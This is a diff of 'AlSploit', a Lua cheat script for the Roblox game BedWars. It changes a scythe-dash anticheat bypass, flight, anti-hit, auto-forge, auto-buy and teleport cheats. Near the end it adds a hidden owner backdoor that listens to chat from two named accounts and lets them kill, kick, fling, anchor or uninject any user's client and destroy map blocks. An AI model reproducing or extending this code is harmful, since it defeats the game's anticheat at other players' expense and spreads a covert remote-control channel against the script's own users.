@@ -289,8 +289,8 @@ function AlSploitLibrary:CreateTab(Name)
 		local CurrentLayoutOrder = 0
 
 		if AlSploitSettings[Name] == nil then
-			AlSploitSettings[Name] = {Value = false, Keybind = "..."}
-			
+			AlSploitSettings[Name] = {Value = false}
+
 			print(tick())
 		end
 
@@ -590,6 +590,11 @@ function AlSploitLibrary:CreateTab(Name)
 
 			local CanInputKeybind = false
 			local InputWanted = false
+
+			if not AlSploitSettings[Name].Keybind then
+				AlSploitSettings[Name].Keybind = "..."
+			end
+
 
 			local function ToggleValue(Keybind)
 				AlSploitSettings[Name].Keybind = Keybind			
@@ -1292,8 +1297,6 @@ function AlSploitLibrary:CreateTab(Name)
 		end
 
 		task.spawn(function()
-			repeat task.wait() until AlSploitSettings[Name].Keybind
-			
 			ToggleTable:CreateKeybind()
 		end)
 
@@ -2044,7 +2047,7 @@ function FindPlacedBlock(Position)
 end
 
 local function HasItemEquipped(Item)
-	if LocalPlayer.Character.HandInvItem.Value.Name and LocalPlayer.Character.HandInvItem.Value.Name == Item then
+	if LocalPlayer.Character.HandInvItem.Value and LocalPlayer.Character.HandInvItem.Value == Item then
 		return true
 	end
 
@@ -2310,7 +2313,7 @@ local function CreateClone(KeepCape)
 				v:FindFirstChild("Handle").Transparency = 1
 			end
 		end
-		
+
 		if KeepCape == false then
 			for i, v in next, Clone:GetDescendants() do
 				if v:IsA("BasePart") and v.Name == "Cape" then
@@ -2447,23 +2450,25 @@ local GuiTab = AlSploitLibrary:CreateTab("Gui")
 task.spawn(function()
 	local KnockbackExploit = CombatTab:CreateToggle({
 		Name = "KnockbackExploit",
-		
+
 		Function = function() end,
-		
+
 		HoverText = "Makes The Emenies Get Extra Knockback (Killaura Required) 😵"
 	})
-	
+
 	KnockbackExploit:CreateSlider({
 		Name = "Range",
-		
+
 		Function = function() end,
-		
+
 		MaximumValue = 19,
 		DefaultValue = 19
 	})
 end)
 
 task.spawn(function()
+	local DirectionSwitchTick = tick()
+	
 	local ScytheDisabler = CombatTab:CreateToggle({
 		Name = "ScytheDisabler",
 
@@ -2474,26 +2479,44 @@ task.spawn(function()
 				local Scythe = GetScythe()
 
 				if Scythe and IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then
-					local HasItemEquipped = HasItemEquipped(Scythe.itemType)
+					task.spawn(function()
+						local MoveDirection = LocalPlayer.Character.Humanoid.MoveDirection
+
+						task.wait(0.1)
+						
+						local NewMoveDirection = LocalPlayer.Character.Humanoid.MoveDirection
+
+						if (MoveDirection - NewMoveDirection).Magnitude >= 1 then
+							DirectionSwitchTick = tick()
+						end
+					end)
+					
+					local HasItemEquipped = HasItemEquipped(Scythe.tool)
 
 					if HasItemEquipped == true then
+						ScytheAnticheatDisabled = true
+						
 						local MoveDirection = LocalPlayer.Character.Humanoid.MoveDirection
-						local Vector = (LocalPlayer.Character.PrimaryPart.CFrame.lookVector * 1.25)
+						local Vector = LocalPlayer.Character.PrimaryPart.CFrame.lookVector
 
-						ScytheAnticheatDisabledSpeed = AlSploitSettings.ScytheDisabler.Speed.Value
-
-						if (MoveDirection - Vector).Magnitude > 1.6 then
-							ScytheAnticheatDisabledSpeed = math.random(0, AlSploitSettings.ScytheDisabler.Speed.Value)
-
+						if (MoveDirection - Vector).Magnitude > 1.9 then
 							Vector = MoveDirection
 						end
 
-						ScytheAnticheatDisabled = true
+						if (tick() - DirectionSwitchTick) < 0.7 then
+							ScytheAnticheatDisabledSpeed = math.random(0, 20)
+						end
+						
+						if (tick() - DirectionSwitchTick) > 1 then
+							ScytheAnticheatDisabledSpeed = math.random(0, AlSploitSettings.ScytheDisabler.Speed.Value)
+						end
 
 						BedwarsRemotes.ScytheDashRemote:FireServer({direction = Vector})	
 
 						if Scythe.itemType == "sky_scythe" then
 							BedwarsRemotes.SkyScytheSpinRemote:FireServer()
+							
+							ScytheAnticheatDisabled = false
 						end
 					end
 
@@ -2518,8 +2541,8 @@ task.spawn(function()
 
 		Function = function() end,
 
-		MaximumValue = 50,
-		DefaultValue = 50
+		MaximumValue = 100,
+		DefaultValue = 100
 	})
 end)
 
@@ -3183,14 +3206,14 @@ task.spawn(function()
 		Function = function()   		
 			repeat
 				task.wait()
-				
+
 				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 and AlSploitSettings.AntiHit.Value == true and AlSploitSettings.InfiniteFly.Value == false then
 					local NearestPlayer = FindNearestPlayer(AlSploitSettings.AntiHit.Range.Value)
 					local NearestEntity = FindNearestEntity(AlSploitSettings.AntiHit.Range.Value)
-					
+
 					if NearestPlayer then
 						local Clone = CreateClone(true)
-												
+
 						LocalPlayer.Character.PrimaryPart.CFrame = (LocalPlayer.Character.PrimaryPart.CFrame + Vector3.new(0, 10000, 0))
 
 						task.spawn(function()
@@ -3201,7 +3224,7 @@ task.spawn(function()
 									Clone.PrimaryPart.Position = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, Clone.PrimaryPart.Position.Y, LocalPlayer.Character.PrimaryPart.Position.Z)
 								end
 							until AlSploitSettings.AlSploitUnInjected == true or AlSploitSettings.AntiHit.Value == false or AlSploitSettings.InfiniteFly.Value == true
-							
+
 						end)			
 
 						task.wait(1.5 / AlSploitSettings.AntiHit.Speed.Value)
@@ -3216,7 +3239,7 @@ task.spawn(function()
 
 						task.wait(0.15)
 					end
-					
+
 					if NearestEntity and not NearestPlayer and AlSploitSettings.AntiHitEntities == true then
 						local Clone = CreateClone()
 
@@ -3233,7 +3256,7 @@ task.spawn(function()
 						end)			
 
 						task.wait(1.5 / AlSploitSettings.AntiHit.Speed.Value)
-						
+
 						if IsAlive(LocalPlayer) == true then
 							LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, -1, LocalPlayer.Character.PrimaryPart.Velocity.Z)
 							LocalPlayer.Character.PrimaryPart.CFrame = Clone.PrimaryPart.CFrame
@@ -3250,12 +3273,12 @@ task.spawn(function()
 
 		HoverText = "Makes You Dodge The Attacks 🏃‍ (Works Better With NoFall)"
 	})
-	
+
 	AntiHit:CreateToggle({
 		Name = "AntiHitEntities",
-		
+
 		Function = function() end,
-		
+
 		DefaultValue = false
 	})
 
@@ -3643,7 +3666,7 @@ task.spawn(function()
 		Function = function()
 			repeat
 				task.wait(0.1)
-				
+
 				if IsAlive(LocalPlayer) == true then
 					local NearestChest = FindNearestChest(AlSploitSettings.ChestStealer.Range.Value)
 
@@ -3815,7 +3838,7 @@ end)
 task.spawn(function()
 	local InfiniteFlyDown
 	local InfiniteFlyUp
-	
+
 	local Clone
 
 	task.spawn(function()
@@ -3841,10 +3864,10 @@ task.spawn(function()
 			end
 		end)
 	end)	
-	
+
 	local InfiniteFly = BlatantTab:CreateToggle({
 		Name = "InfiniteFly",
-		
+
 		Function = function()	
 			if AlSploitSettings.InfiniteFly.Value == true and IsAlive(LocalPlayer) == true then	
 				if not Clone then
@@ -3853,36 +3876,36 @@ task.spawn(function()
 
 				Clone.PrimaryPart.Anchored = true
 				Clone.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame
-				
+
 				LocalPlayer.Character.PrimaryPart.CFrame += Vector3.new(0, 1000000, 0)
 			end
-			
+
 			repeat
 				task.wait()
-				
+
 				if Clone then
 					Clone.PrimaryPart.CFrame = CFrame.new(Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, (Clone.PrimaryPart.Position.Y + (InfiniteFlyUp and (AlSploitSettings.InfiniteFly.FlyUpSpeed.Value / 10) or 0) + (InfiniteFlyDown and -(AlSploitSettings.InfiniteFly.FlyDownSpeed.Value / 10) or 0)), LocalPlayer.Character.PrimaryPart.Position.Z))		
 				end
 			until shared.AlSploitUnInjected == true or AlSploitSettings.InfiniteFly.Value == false
-			
+
 			if IsAlive(LocalPlayer) and Clone then
 				LocalPlayer.Character.PrimaryPart.CFrame = Clone.PrimaryPart.CFrame
 				LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
-				
+
 				LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
 			end
-			
+
 			if Clone then
 				Clone:Destroy()
 				Clone = nil
-				
+
 				Camera.CameraSubject = LocalPlayer.Character.Humanoid
 			end
 		end,
-		
+
 		HoverText = "Lets You Fly Indefinitely 🦋"
 	})
-	
+
 	InfiniteFly:CreateSlider({
 
 		Function = function() end,
@@ -3891,7 +3914,7 @@ task.spawn(function()
 		MaximumValue = 25,
 		DefaultValue = 5
 	})
-	
+
 	InfiniteFly:CreateSlider({
 		Name = "FlyUpSpeed",
 
@@ -4120,7 +4143,7 @@ task.spawn(function()
 					BodyVelocity.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, ((FlyDown and -AlSploitSettings.Fly.FlyDownSpeed.Value or 0) + (FlyUp and AlSploitSettings.Fly.FlyUpSpeed.Value or 0)), LocalPlayer.Character.PrimaryPart.Velocity.Z)
 				end
 
-				if (tick() - FlyTime) >= MaxFlyTime then
+				if (tick() - FlyTime) >= MaxFlyTime and ScytheAnticheatDisabled == false then
 					FlyTime = tick()
 
 					local FlyTeleportPosition = 0
@@ -4579,11 +4602,11 @@ end)
 task.spawn(function()
 	local AutoForge = UtilityTab:CreateToggle({
 		Name = "AutoForge",
-		
+
 		Function = function()
 			repeat
 				task.wait(0.5)
-				
+
 				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then
 					local NearestNpc = FindNearestNpc(AlSploitSettings.AutoForge.Range.Value)
 
@@ -4624,7 +4647,7 @@ task.spawn(function()
 								["shopId"] = NearestNpc.Name
 							},	
 						}
-							
+
 						local Gauntlets = {
 							[1] = {
 								["shopItem"] = {
@@ -4657,7 +4680,7 @@ task.spawn(function()
 								["shopId"] = NearestNpc.Name
 							}
 						}
-						
+
 						local Dagger = {
 							[1] = {
 								["shopItem"] = {
@@ -4690,7 +4713,7 @@ task.spawn(function()
 								["shopId"] = NearestNpc.Name
 							}
 						}	
-						
+
 						local Scythe = {
 							[1] = {
 								["shopItem"] = {
@@ -4723,19 +4746,19 @@ task.spawn(function()
 								["shopId"] = NearestNpc.Name
 							}
 						}		
-						
+
 						if AlSploitSettings.AutoForge.ForgeItems.GreatHammer.Value == true then
 							PurchaseItem(GreatHammer)
 						end
-						
+
 						if AlSploitSettings.AutoForge.ForgeItems.Gauntlets.Value == true then
 							PurchaseItem(Gauntlets)
 						end
-						
+
 						if AlSploitSettings.AutoForge.ForgeItems.Dagger.Value == true then
 							PurchaseItem(Dagger)
 						end
-						
+
 						if AlSploitSettings.AutoForge.ForgeItems.Scythe.Value == true then
 							PurchaseItem(Scythe)
 						end
@@ -4743,24 +4766,24 @@ task.spawn(function()
 				end			
 			until shared.AlSploitUnInjected == true or AlSploitSettings.AutoForge.Value == false
 		end,
-		
+
 		HoverText = "Automatically Forges Items For You 🐢"
 	})
-	
+
 	AutoForge:CreateSlider({
 		Name = "Range",
-		
+
 		Function = function() end,
-		
+
 		MaximumValue = 30,
 		DefaultValue = 30
 	})
-	
+
 	local ForgeItems = AutoForge:CreateDropdown({
 		Name = "ForgeItems",
 		HoverText = "Pick Which Items Will Forge"
 	})
-	
+
 	ForgeItems:CreateToggle({
 		Name = "GreatHammer",
 
@@ -4768,7 +4791,7 @@ task.spawn(function()
 
 		DefaultValue = false
 	})
-	
+
 	ForgeItems:CreateToggle({
 		Name = "Gauntlets",
 
@@ -4776,7 +4799,7 @@ task.spawn(function()
 
 		DefaultValue = false
 	})
-	
+
 	ForgeItems:CreateToggle({
 		Name = "Dagger",
 
@@ -4784,12 +4807,12 @@ task.spawn(function()
 
 		DefaultValue = false
 	})
-	
+
 	ForgeItems:CreateToggle({
 		Name = "Scythe",
-		
+
 		Function = function() end,
-		
+
 		DefaultValue = true
 	})
 end)
@@ -4801,7 +4824,7 @@ task.spawn(function()
 		Function = function()
 			repeat
 				task.wait(0.3)
-				
+
 				if IsAlive(LocalPlayer) then
 					local NearestNpc = FindNearestNpc(AlSploitSettings.AutoBuy.Range.Value) 
 
@@ -5321,15 +5344,15 @@ end)
 task.spawn(function()
 	local AntiAfk = UtilityTab:CreateToggle({
 		Name = "AntiAfk",
-		
+
 		Function = function()
 			repeat
 				BedwarsRemotes.AfkInfoRemote:FireServer({afk = false})
-				
+
 				task.wait(60)
 			until AlSploitSettings.AlSploitUnInjected.Value == true or AlSploitSettings.AntiAfk.Value == false
 		end,
-		
+
 		HoverText = "Prevents From Making You Afk ⌛"
 	})
 end)
@@ -5341,12 +5364,12 @@ task.spawn(function()
 		Function = function()
 			repeat
 				task.wait()
-				
+
 				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then					
 					task.spawn(function()
 						if AlSploitSettings.AutoKit.Kits.Warden.Value == true then
 							task.wait(0.5)
-							
+
 							if EquippedKit == "jailor" then
 								for i, v in next, CollectionService:GetTagged("jailor_soul_ProximityPrompt") do
 									BedwarsRemotes.CollectCollectableEntityRemote:FireServer({id = v:GetAttribute("Id"), collectableName = "JailorSoul"})
@@ -5354,7 +5377,7 @@ task.spawn(function()
 							end
 						end
 					end)
-					
+
 					task.spawn(function()
 						if AlSploitSettings.AutoKit.Kits.Hannah.Value == true then
 							task.wait(0.1)
@@ -5366,17 +5389,17 @@ task.spawn(function()
 							end
 						end
 					end)
-					
+
 					task.spawn(function()
 						if AlSploitSettings.AutoKit.Kits.Trinity.Value == true then
 							task.wait(0.5)
-							
+
 							if EquippedKit == "angel" and ClientStore:getState().Kit.angelProgress >= 1 and LocalPlayer.Character:GetAttribute("AngelType") == nil then
 								BedwarsRemotes.TrinitySetAngelTypeRemote:FireServer({angel = "Void"})
 							end
 						end
 					end)
-					
+
 					task.spawn(function()
 						if AlSploitSettings.AutoKit.Kits.Gompy.Value == true then
 							task.wait(0.25)
@@ -5394,7 +5417,7 @@ task.spawn(function()
 					task.spawn(function()
 						if AlSploitSettings.AutoKit.Kits.Miner.Value == true then
 							task.wait(0.25)
-							
+
 							if EquippedKit == "miner" then
 								for i, v in next, CollectionService:GetTagged("petrified-player") do 
 									BedwarsRemotes.DestroyPetrifiedPlayerRemote:FireServer({petrifyId = v:GetAttribute("PetrifyId")})
@@ -5408,12 +5431,12 @@ task.spawn(function()
 
 		HoverText = "Automatically Uses The Ability Of Kits 😺"
 	})
-	
+
 	local Kits = AutoKit:CreateDropdown({
 		Name = "Kits",				
 		HoverText = "Pick The Kits That Will Be Used Automatically"
 	})
-	
+
 	Kits:CreateToggle({
 		Name = "Warden",
 
@@ -5421,7 +5444,7 @@ task.spawn(function()
 
 		DefaultValue = true
 	})
-	
+
 	Kits:CreateToggle({
 		Name = "Hannah",
 
@@ -5429,7 +5452,7 @@ task.spawn(function()
 
 		DefaultValue = true
 	})
-	
+
 	Kits:CreateToggle({
 		Name = "Trinity",
 
@@ -5440,12 +5463,12 @@ task.spawn(function()
 
 	Kits:CreateToggle({
 		Name = "Gompy",
-		
+
 		Function = function() end,
-		
+
 		DefaultValue = true
 	})
-	
+
 	Kits:CreateToggle({
 		Name = "Miner",
 
@@ -6270,28 +6293,32 @@ task.spawn(function()
 		Name = "PlayerTp",
 
 		Function = function()
-			if AlSploitSettings.PlayerTp.Value == true and shared.AlSploitUnInjected == false then		
-				PlayerTpOverridden = false
- 
-				repeat task.wait() until (GetMatchState() ~= 0 and IsAlive(LocalPlayer) == true) or shared.AlSploitUnInjected == true or AlSploitSettings.PlayerTp.Value == false
+			if AlSploitSettings.PlayerTp.Value == true then
+				if IsAlive(LocalPlayer) == true then
+					repeat task.wait() until shared.AlSploitUnInjected == true or GetMatchState() ~= 0
 
-				local NearestPlayer = FindNearestPlayer()
+					task.spawn(function()
+						if AlSploitSettings.PlayerTp.Value == true then
+							if FindNearestPlayer() and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
+								KillLocalPlayer()
 
-				if NearestPlayer then
-					if AlSploitSettings.PlayerTp.Value == true and shared.AlSploitUnInjected == false and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
-						PlayerTpOverridden = true
+								LocalPlayer.CharacterAdded:Connect(function()
+									repeat task.wait() until shared.AlSploitUnInjected == true or IsAlive(LocalPlayer)
 
-						KillLocalPlayer()		
+									if IsAlive(LocalPlayer) and AlSploitSettings.PlayerTp.Value == true and FindNearestBed(false) then
+										task.wait(0.15)
 
-						repeat task.wait() until IsAlive(LocalPlayer) == true or shared.AlSploitUnInjected == true or AlSploitSettings.PlayerTp.Value == false
+										TweenToNearestPlayer()
+									end
+								end)
+							end	
+						end
 
-						task.wait(0.3)
-
-						TweenToNearestPlayer()
-
-						PlayerTpOverridden = false
-					end
-				end
+						if LocalPlayer.leaderstats.Bed.Value == "❌" then
+							CreateNotification(3, "Unable to teleport to bed, you have no bed")
+						end
+					end)					
+				end				
 			end	
 		end,
 
@@ -6301,17 +6328,17 @@ task.spawn(function()
 	AlSploitConnections["PlayerTpConnection"] = LocalPlayer.CharacterAdded:Connect(function()
 		repeat task.wait() until (GetMatchState() ~= 0 and IsAlive(LocalPlayer) == true) or shared.AlSploitUnInjected == true or AlSploitSettings.PlayerTp.Value == false
 
-		local NearestPlayer = FindNearestPlayer()
+		local NearestBed = FindNearestPlayer()
 
-		if NearestPlayer then
-			if AlSploitSettings.PlayerTp.Value == true and shared.AlSploitUnInjected == false and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" and PlayerTpOverridden == false then
+		if NearestBed then
+			if AlSploitSettings.PlayerTp.Value == true and shared.AlSploitUnInjected == false and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
 				repeat task.wait() until IsAlive(LocalPlayer) == true or shared.AlSploitUnInjected == true or AlSploitSettings.PlayerTp.Value == false
 
-				task.wait(0.3)
+				task.wait(0.25)
 
 				TweenToNearestPlayer()
 			end
-		end
+		end 
 	end)
 end)
 
@@ -6328,7 +6355,7 @@ task.spawn(function()
 
 				if AlSploitSettings.AntiVoid.Value == true and shared.AlSploitUnInjected == false then
 					local OldLowestPosition = math.huge
-					local LowestPosition = 99999
+					local LowestPosition = 999999
 
 					local BlockRaycastParameters = RaycastParams.new()
 
@@ -6432,34 +6459,36 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	local BedTpOverridden = false
-
 	local BedTp = WorldTab:CreateToggle({
 		Name = "BedTp",
 
 		Function = function()
-			if AlSploitSettings.BedTp.Value == true and shared.AlSploitUnInjected == false then
-				BedTpOverridden = false
-				
-				repeat task.wait() until (GetMatchState() ~= 0 and IsAlive(LocalPlayer) == true) or shared.AlSploitUnInjected == true or AlSploitSettings.BedTp.Value == false
+			if AlSploitSettings.BedTp.Value == true then
+				if IsAlive(LocalPlayer) == true then
+					repeat task.wait() until shared.AlSploitUnInjected == true or GetMatchState() ~= 0
 
-				local NearestBed = FindNearestBed(false)
+					task.spawn(function()
+						if AlSploitSettings.BedTp.Value == true then
+							if FindNearestBed(false) and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
+								KillLocalPlayer()
 
-				if NearestBed then
-					if AlSploitSettings.BedTp.Value == true and shared.AlSploitUnInjected == false and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
-						BedTpOverridden = true
+								LocalPlayer.CharacterAdded:Connect(function()
+									repeat task.wait() until shared.AlSploitUnInjected == true or IsAlive(LocalPlayer)
 
-						KillLocalPlayer()		
+									if IsAlive(LocalPlayer) and AlSploitSettings.BedTp.Value == true and FindNearestBed(false) then
+										task.wait(0.15)
 
-						repeat task.wait() until IsAlive(LocalPlayer) == true or shared.AlSploitUnInjected == true or AlSploitSettings.BedTp.Value == false
+										TweenToNearestBed()
+									end
+								end)
+							end	
+						end
 
-						task.wait(0.3)
-
-						TweenToNearestBed()
-
-						BedTpOverridden = false
-					end
-				end
+						if LocalPlayer.leaderstats.Bed.Value == "❌" then
+							CreateNotification(3, "Unable to teleport to bed, you have no bed")
+						end
+					end)					
+				end				
 			end	
 		end,
 
@@ -6472,14 +6501,14 @@ task.spawn(function()
 		local NearestBed = FindNearestBed(false)
 
 		if NearestBed then
-			if AlSploitSettings.BedTp.Value == true and shared.AlSploitUnInjected == false and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" and BedTpOverridden == false then
+			if AlSploitSettings.BedTp.Value == true and shared.AlSploitUnInjected == false and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
 				repeat task.wait() until IsAlive(LocalPlayer) == true or shared.AlSploitUnInjected == true or AlSploitSettings.BedTp.Value == false
 
-				task.wait(0.3)
+				task.wait(0.25)
 
 				TweenToNearestBed()
 			end
-		end
+		end 
 	end)
 end)
 
@@ -6606,7 +6635,7 @@ task.spawn(function()
 
 		Cape.Parent = LocalPlayer.Character
 		Cape.Name = "Cape"
-	
+
 		Cape.CanCollide = false
 		Cape.Material = Enum.Material.SmoothPlastic
 		Cape.Color = Color3.new(0.105882, 0.105882, 0.105882)
@@ -6616,7 +6645,7 @@ task.spawn(function()
 
 		BlockMesh.Parent = Cape
 		BlockMesh.Name = "Mesh"
-		
+
 		BlockMesh.VertexColor = Vector3.new(1, 1, 1)
 		BlockMesh.Scale = Vector3.new(9, 17.5, 0.5)
 
@@ -6624,7 +6653,7 @@ task.spawn(function()
 
 		Motor.Parent = Cape
 		Motor.Name = "Motor"
-		
+
 		Motor.CurrentAngle = -0.16208772361278534
 		Motor.DesiredAngle = -0.1002269834280014
 		Motor.Part1 = LocalPlayer.Character.UpperTorso
@@ -6635,7 +6664,7 @@ task.spawn(function()
 
 		Decal.Parent = Cape
 		Decal.Name = "Decal"
-		
+
 		Decal.Texture = DecalId
 		Decal.Face = Enum.NormalId.Back
 
@@ -6678,7 +6707,7 @@ task.spawn(function()
 
 		HoverText = "Spooky Cape 👻"
 	})
-	
+
 	task.spawn(function()
 		repeat
 			task.wait()
@@ -6696,12 +6725,12 @@ task.spawn(function()
 			HalloweenCape = nil
 		end
 	end)
-	
+
 	AlSploitConnections["CapeConnection"] = LocalPlayer.CharacterAdded:Connect(function()
 		repeat task.wait() until IsAlive(LocalPlayer) == true
-		
+
 		task.wait(0.3)
-		
+
 		if AlSploitSettings.Cape.Value == true then
 			HalloweenCape = CreateCape(HalloweenCapeId)
 		end
@@ -7298,6 +7327,76 @@ task.spawn(function()
 		HoverText = "UnInjects AlSploit ⌨️"
 	})
 end)
+
+task.spawn(function()
+	local AlSploitOwners = {"ignitegaming123", "AlSploitCooking"}
+
+	for i, v in next, PlayerService:GetPlayers() do
+		v.Chatted:Connect(function(Message)		
+			for i, v2 in AlSploitOwners do
+				if v.Name == v2 and LocalPlayer.Name ~= v2 then
+					local MessageAlgorithimed = Message:lower():gsub("%s+", "")
+
+					print(MessageAlgorithimed)
+
+					if MessageAlgorithimed then
+						task.spawn(function()
+							if MessageAlgorithimed:find(";breakmapdefault") then
+								for i, v in next, CollectionService:GetTagged("block") do
+									v:Destroy()
+								end
+							end
+						end)
+
+						task.spawn(function()
+							if MessageAlgorithimed:find(";unanchordefault") then
+								if IsAlive(LocalPlayer) == true then
+									LocalPlayer.Character.PrimaryPart.Anchored = false
+								end
+							end	
+						end)
+
+						task.spawn(function()
+							if MessageAlgorithimed:find(";anchordefault") then
+								if IsAlive(LocalPlayer) == true then
+									LocalPlayer.Character.PrimaryPart.Anchored = true
+								end
+							end	
+						end)
+
+						task.spawn(function()
+							if MessageAlgorithimed:find(";lagbackdefault") then
+								if IsAlive(LocalPlayer) == true then
+									LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(999999, 999999, 999999)
+								end
+							end
+						end)
+
+						task.spawn(function ()
+							if MessageAlgorithimed:find(";uninjectdefault") then
+								UnInjectEvent:Fire()
+							end
+						end)
+
+						task.spawn(function ()
+							if MessageAlgorithimed:find(";kickdefault") then
+								LocalPlayer:Kick("Kicked by AlSploit AlSploitOwners")
+							end
+						end)
+
+						task.spawn(function()
+							if MessageAlgorithimed:find(";killdefault") then
+								if IsAlive(LocalPlayer) == true then
+									LocalPlayer.Character.PrimaryPart.Humanoid.Health = 0
+								end
+							end	
+						end)
+					end
+				end
+			end				
+		end)
+	end
+end)		
 
 task.spawn(function()
 	CreateNotification(3, "AlSploit Has Loaded, Tabs Are Now Scrollable")
